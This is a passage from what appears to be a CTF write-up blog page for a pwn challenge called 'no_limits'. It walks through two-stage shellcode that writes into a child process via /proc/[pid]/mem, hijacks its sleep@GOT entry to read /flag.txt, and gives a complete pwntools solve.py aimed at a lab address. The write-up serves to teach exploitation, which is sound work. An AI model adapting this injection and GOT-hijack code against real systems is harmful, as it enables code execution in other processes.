+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">rax</span>            <span class="cm">/* bytes read */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>              <span class="cm">/* sys_write */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="mi">1</span>              <span class="cm">/* stdout */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rsp</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">syscall</span>
+</span></span></code></pre></div><p>Writes the flag content to stdout (file descriptor 1). The number of bytes to write comes from the return value of <code>read()</code> in <code>rax</code>.</p>
+<p><strong>Clean Exit:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">60</span>             <span class="cm">/* sys_exit */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">xor</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rdi</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">syscall</span>
+</span></span></code></pre></div><p>Exits the child process cleanly with exit code 0. This prevents the child from crashing and ensures the flag output is flushed.</p>
+<p><strong>Data Section:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="na">.align</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="nl">flagpath:</span>
+</span></span><span class="line"><span class="cl">    <span class="na">.asciz</span> <span class="s">&#34;/flag.txt&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="na">.align</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="nl">stage2_end:</span>
+</span></span></code></pre></div><p>Contains the path string for the flag file, and marks the end of stage 2 for size calculation.</p>
+<h4 id="exploit-execution-flow">Exploit Execution Flow</h4>
+<p>The complete exploit flow works as follows:</p>
+<ol>
+<li><strong>Connect and Get Child PID</strong>: Send command <code>2</code> to get debug information, which reveals the child process PID</li>
+<li><strong>Allocate Executable Memory</strong>: Send command <code>1</code> to create memory with RWX permissions for our shellcode</li>
+<li><strong>Inject Shellcode</strong>: Upload the stage 1 shellcode (which contains stage 2 embedded within it)</li>
+<li><strong>Execute Stage 1</strong>: Send command <code>3</code> to execute our shellcode at the allocated address</li>
+<li><strong>Stage 1 Actions</strong>:
+<ul>
+<li>Opens <code>/proc/[child_pid]/mem</code></li>
+<li>Writes stage 2 shellcode to address <code>0x4012B0</code> in child&rsquo;s memory</li>
+<li>Overwrites child&rsquo;s <code>sleep@GOT</code> entry to point to <code>0x4012B0</code></li>
+<li>Enters infinite loop to keep parent alive</li>
+</ul>
+</li>
+<li><strong>Wait for Child</strong>: The child continues its loop, and after ~5 seconds calls <code>sleep()</code></li>
+<li><strong>GOT Hijack Triggers</strong>: Instead of calling <code>sleep()</code>, the child jumps to our stage 2 shellcode</li>
+<li><strong>Stage 2 Executes</strong>:
+<ul>
+<li>Opens <code>/flag.txt</code></li>
+<li>Reads flag content (using unrestricted <code>read()</code> syscall)</li>
+<li>Writes flag to stdout</li>
+<li>Exits cleanly</li>
+</ul>
+</li>
+</ol>
+<h3 id="solvepy">solve.py</h3>
+<p>The Python exploit script handles all the steps automatically:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./no_limits&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">GOT_SLEEP</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;sleep&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">TARGET_ADDR</span> <span class="o">=</span> <span class="mh">0x4012B0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_payload</span><span class="p">(</span><span class="n">child_pid</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">asm_src</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    .intel_syntax noprefix
+</span></span></span><span class="line"><span class="cl"><span class="s1">    .globl _start
+</span></span></span><span class="line"><span class="cl"><span class="s1">    _start:
+</span></span></span><span class="line"><span class="cl"><span class="s1">        call get_rip
+</span></span></span><span class="line"><span class="cl"><span class="s1">    get_rip:
+</span></span></span><span class="line"><span class="cl"><span class="s1">        pop rbx
+</span></span></span><span class="line"><span class="cl"><span class="s1">        
+</span></span></span><span class="line"><span class="cl"><span class="s1">        lea r12, stage2[rip]
+</span></span></span><span class="line"><span class="cl"><span class="s1">        lea r13, stage2_end[rip]
+</span></span></span><span class="line"><span class="cl"><span class="s1">        sub r13, r12
+</span></span></span><span class="line"><span class="cl"><span class="s1">        
+</span></span></span><span class="line"><span class="cl"><span class="s1">        lea rdi, path[rip]
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rsi, 1
+</span></span></span><span class="line"><span class="cl"><span class="s1">        xor rdx, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rax, 2
+</span></span></span><span class="line"><span class="cl"><span class="s1">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">        
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rdi, rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">        
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rax, 8
+</span></span></span><span class="line"><span class="cl"><span class="s1">        movabs rsi, </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">TARGET_ADDR</span><span class="p">)</span><span class="si">}</span><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">        xor rdx, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s1">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">        
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rax, 1
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rsi, r12
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rdx, r13
+</span></span></span><span class="line"><span class="cl"><span class="s1">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">        
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rax, 8
+</span></span></span><span class="line"><span class="cl"><span class="s1">        movabs rsi, </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">GOT_SLEEP</span><span class="p">)</span><span class="si">}</span><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">        xor rdx, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s1">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">        
+</span></span></span><span class="line"><span class="cl"><span class="s1">        lea rsi, got_value[rip]
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rdx, 8
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rax, 1
+</span></span></span><span class="line"><span class="cl"><span class="s1">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">    
+</span></span></span><span class="line"><span class="cl"><span class="s1">    .align 8
+</span></span></span><span class="line"><span class="cl"><span class="s1">    loop:
+</span></span></span><span class="line"><span class="cl"><span class="s1">        jmp loop
+</span></span></span><span class="line"><span class="cl"><span class="s1">    
+</span></span></span><span class="line"><span class="cl"><span class="s1">    .align 8
+</span></span></span><span class="line"><span class="cl"><span class="s1">    got_value:
+</span></span></span><span class="line"><span class="cl"><span class="s1">        .quad </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">TARGET_ADDR</span><span class="p">)</span><span class="si">}</span><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">    .align 8
+</span></span></span><span class="line"><span class="cl"><span class="s1">    path:
+</span></span></span><span class="line"><span class="cl"><span class="s1">        .asciz &#34;/proc/</span><span class="si">{</span><span class="n">child_pid</span><span class="si">}</span><span class="s1">/mem&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    .align 8
+</span></span></span><span class="line"><span class="cl"><span class="s1">    stage2:
+</span></span></span><span class="line"><span class="cl"><span class="s1">        lea rdi, flagpath[rip]
+</span></span></span><span class="line"><span class="cl"><span class="s1">        xor rsi, rsi
+</span></span></span><span class="line"><span class="cl"><span class="s1">        xor rdx, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rax, 2
+</span></span></span><span class="line"><span class="cl"><span class="s1">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">        
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rdi, rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">        sub rsp, 0x300
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rsi, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rdx, 0x200
+</span></span></span><span class="line"><span class="cl"><span class="s1">        xor rax, rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">        
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rdx, rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rax, 1
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rdi, 1
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rsi, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s1">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">        
+</span></span></span><span class="line"><span class="cl"><span class="s1">        mov rax, 60
+</span></span></span><span class="line"><span class="cl"><span class="s1">        xor rdi, rdi
+</span></span></span><span class="line"><span class="cl"><span class="s1">        syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">    .align 8
+</span></span></span><span class="line"><span class="cl"><span class="s1">    flagpath:
+</span></span></span><span class="line"><span class="cl"><span class="s1">        .asciz &#34;/flag.txt&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    .align 8
+</span></span></span><span class="line"><span class="cl"><span class="s1">    stage2_end:
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">asm</span><span class="p">(</span><span class="n">asm_src</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;10.1.106.87&#39;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>  <span class="c1"># Change to process(&#39;./no_limits&#39;) for local</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;command you want to do:&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Child PID = &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">child_pid</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Child PID: </span><span class="si">{</span><span class="n">child_pid</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">sc</span> <span class="o">=</span> <span class="n">build_payload</span><span class="p">(</span><span class="n">child_pid</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;command you want to do:&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;permissions&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;7&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;include?&#39;</span><span class="p">,</span> <span class="n">sc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Wrote your buffer at &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Shellcode at: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;command you want to do:&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;execute&#39;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Waiting for child to call sleep() and print flag...&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sleep</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div>
+    </div>
+</div>
+
+            </main>
+        </div>
+
+
+        <footer class="footer">
+    
+        <span>
+            © 2025 XeroExecute Blog, Built with
+            <a href="https://gohugo.io" class="footerLink">Hugo</a> and
+            <a href="https://github.com/LordMathis/hugo-theme-nightfall" class="footerLink">Nightfall</a> theme
+        </span>
+    
+</footer>
+    </div>
+
+</body>
+
+</html>
